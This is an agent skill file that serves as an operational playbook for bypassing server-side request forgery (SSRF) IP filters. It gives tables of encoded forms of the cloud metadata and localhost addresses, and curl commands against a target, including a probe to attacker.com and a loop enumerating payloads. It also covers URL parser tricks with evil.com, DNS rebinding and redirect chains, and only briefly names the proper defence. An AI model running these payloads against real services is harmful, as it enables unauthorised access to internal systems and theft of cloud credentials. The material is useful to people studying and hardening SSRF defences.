---
name: ssrf-ip-filter-bypass
description: Bypass IP-based SSRF filters using hex/octal/decimal encoding of blocked addresses. Use when SSRF endpoint has string-based IP validation blocking cloud metadata or internal ranges.
---

# SSRF IP Filter Bypass via Address Encoding

## Pattern
- SSRF endpoint exists but blocks known internal IPs (169.254.169.254, 127.0.0.1, 10.x, 172.16.x)
- Filter is string/regex-based (not post-resolution IP comparison)
- OS network stack resolves encoded IPs to their real addresses

## Core Technique
Encode blocked IP addresses in alternative representations that bypass string filters but resolve identically at the network layer.

### AWS Metadata (169.254.169.254) — All Variants

| Variant | Value | Bypasses |
|---|---|---|
| First octet hex | `0xa9.254.169.254` | `^169\.` regex filters |
| All octets hex | `0xa9.0xfe.0xa9.0xfe` | Any dotted-decimal regex |
| Full hex integer | `0xA9FEA9FE` | Dotted-notation filters |
| Decimal integer | `2852039166` | Dotted-notation filters |
| Octal | `0251.0376.0251.0376` | Decimal-only filters |
| Mixed | `0xa9.254.0xa9.254` | Partial regex filters |
| IPv6-mapped | `[::ffff:a9fe:a9fe]` | IPv4-only filters |
| IPv6 shorthand | `[::ffff:169.254.169.254]` | IPv4-only filters |

### Localhost (127.0.0.1) — All Variants

| Variant | Value | Bypasses |
|---|---|---|
| Hex | `0x7f.0.0.1` | `^127\.` regex |
| Decimal integer | `2130706433` | Dotted-notation |
| Octal | `0177.0.0.1` | Decimal filters |
| Full hex | `0x7f000001` | All dotted filters |
| IPv6 | `[::1]` | IPv4 filters |
| IPv6-mapped | `[::ffff:7f00:1]` | IPv4 filters |
| Zero-padded | `127.000.000.001` | Exact match filters |

### Internal Ranges (10.x, 172.16.x, 192.168.x)

Apply same encoding strategy — hex first octet is usually sufficient:
- `10.0.0.1` → `0xa.0.0.1`
- `172.16.0.1` → `0xac.16.0.1`
- `192.168.1.1` → `0xc0.168.1.1`

## Testing Procedure

### 1. Confirm SSRF primitive exists
```bash
curl -x localhost:8080 -k "https://target.com/fetch?url=http://attacker.com/probe"
```

### 2. Confirm IP filter blocks direct access
```bash
curl -x localhost:8080 -k "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"
# Expected: blocked/filtered response
```

### 3. First-octet hex (try this first)
The highest-success-rate bypass. Minimal mutation, breaks the most common filter patterns:
```bash
# AWS metadata
curl -x localhost:8080 -k "https://target.com/fetch?url=http://0xa9.254.169.254/latest/meta-data/"
# Localhost
curl -x localhost:8080 -k "https://target.com/fetch?url=http://0x7f.0.0.1/"
```
If this works, you're done. If not, enumerate remaining variants.

### 4. Enumerate all variants (if first-octet hex fails)
```bash
for ip in "0xa9.0xfe.0xa9.0xfe" "0xA9FEA9FE" "2852039166" \
          "0251.0376.0251.0376" "[::ffff:a9fe:a9fe]" "0xa9.254.0xa9.254" \
          "[::ffff:169.254.169.254]"; do
  echo "--- Testing: $ip ---"
  curl -x localhost:8080 -k -s -o /dev/null -w "%{http_code}" \
    "https://target.com/fetch?url=http://${ip}/latest/meta-data/"
  echo
done
```

### 5. Double/triple URL encoding (if filter decodes once before checking)
Some filters URL-decode the input, then check the decoded string. Double-encode so the filter sees the encoded form but the backend decodes again:
```bash
# Single-encoded dots (filter may decode and block)
curl -x localhost:8080 -k "https://target.com/fetch?url=http://169%2e254%2e169%2e254/"
# Double-encoded dots (filter decodes to %2e, backend decodes to .)
curl -x localhost:8080 -k "https://target.com/fetch?url=http://169%252e254%252e169%252e254/"
# Double-encoded slash in path
curl -x localhost:8080 -k "https://target.com/fetch?url=http://0xa9.254.169.254%252flatest%252fmeta-data/"
# Triple-encode if two decode layers exist
curl -x localhost:8080 -k "https://target.com/fetch?url=http://169%25252e254%25252e169%25252e254/"
```
Combine with IP encoding variants above — double-encode the hex IP for maximum bypass depth.

### 6. URL validation bypass (host/scheme/auth confusion)
When the filter validates the URL structure (allowlisted host, scheme check), not just the IP:

**Embedded credentials (userinfo):**
```
http://allowed.com@169.254.169.254/     → browser sends to 169.254.169.254, filter sees allowed.com
http://169.254.169.254@allowed.com/     → some parsers extract host as allowed.com (passes allowlist)
http://allowed.com:anything@evil.com/   → userinfo = "allowed.com:anything", host = evil.com
```

**Backslash as path separator:**
```
http://allowed.com\@169.254.169.254/    → some parsers treat \ as / (WHATWG spec converts \ to / in special schemes)
http://evil.com\allowed.com             → parser confusion on host boundary
```

**Fragment confusion:**
```
http://evil.com#@allowed.com            → filter parses host as allowed.com (after #@), actual host is evil.com
http://evil.com%23@allowed.com          → encoded # bypasses fragment-aware parsers
```

**Scheme tricks:**
```
http://169.254.169.254               → blocked
//169.254.169.254                     → scheme-relative, inherits current scheme, may bypass scheme check
http:169.254.169.254                  → scheme without // (valid per RFC, some parsers accept)
http:///169.254.169.254               → triple slash, parser confusion
```

**Hostname obfuscation:**
```
http://169.254.169.254./              → trailing dot (FQDN), bypasses string match
http://169.254.169.254%00.allowed.com → null byte truncation (legacy parsers)
http://[::ffff:169.254.169.254]/      → IPv6 brackets bypass IPv4 regex
http://0xa9fea9fe/                    → no dots at all (integer IP)
```

**DNS rebinding** (when filter resolves then fetches separately):
```
1. Register domain with TTL=0 pointing to allowed IP
2. Filter resolves → allowed IP → passes check
3. TTL expires, re-resolves → 169.254.169.254
4. Fetch hits internal IP
```

**Open redirect chain** (when filter checks initial URL but follows redirects):
```
http://allowed.com/redirect?url=http://169.254.169.254/latest/meta-data/
```

## Why First-Octet Hex Specifically
Most filters regex on `^169\.254\.` or `^127\.0\.`. Encoding just the first octet (`0xa9`, `0x7f`) is the minimal mutation that breaks the most common patterns while keeping the URL parseable by almost all backends.

## Prerequisites
- SSRF endpoint with string-based IP validation (not post-resolution check)
- Backend OS resolves hex/octal/integer IPs (Linux, macOS, most Windows)
- Target network can reach the internal IP from the server side

## Key Insight
String-based IP filters are fundamentally broken because IP addresses have many valid text representations that all resolve to the same network address. The only correct defense is to resolve the URL to an IP first, then check the resolved IP — but most implementations check the string before resolution.
